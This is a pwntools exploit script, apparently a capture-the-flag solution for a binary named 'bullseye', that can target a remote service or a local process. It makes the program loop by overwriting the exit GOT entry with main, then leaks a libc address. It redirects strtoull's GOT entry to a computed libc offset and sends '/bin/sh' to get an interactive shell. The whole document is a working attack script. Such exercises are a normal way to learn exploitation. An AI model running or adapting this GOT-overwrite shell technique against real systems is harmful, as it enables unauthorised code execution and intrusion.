from pwn import *

e = ELF("./bullseye")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("jh2i.com", 50031)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

p.sendlineafter("?", hex(e.got["exit"])[2:])
debug()
p.sendlineafter("?", hex(e.symbols["main"])[2:])

p.recvuntil("0x")
leak = int(p.recvline(), 16)

print(hex(leak))

p.sendlineafter("?", hex(e.got["strtoull"])[2:])
p.sendlineafter("?", hex(leak - 0x90700)[2:])

p.recvuntil("0x")

p.sendlineafter("?", "/bin/sh")



p.interactive()
